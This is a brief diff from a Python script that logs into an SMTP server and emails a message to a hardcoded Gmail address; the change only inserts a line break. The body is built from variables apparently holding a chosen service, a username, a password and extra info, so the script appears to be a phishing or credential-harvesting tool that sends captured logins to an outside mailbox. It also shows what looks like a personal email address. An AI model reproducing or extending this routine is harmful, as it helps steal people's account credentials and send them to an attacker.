@@ -135,7 +135,7 @@ s.login(sa, kl)
 
 ra = 'bertranddupont885@gmail.com'
 if option != 4:
- connexion = cho + ' - ' + usn + ' - ' + usp + info
+ connexion = cho + ' - ' + usn + ' - ' + usp + '\n\n' + info
  msg = MIMEMultipart()
  msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
  msg.attach(msgText)
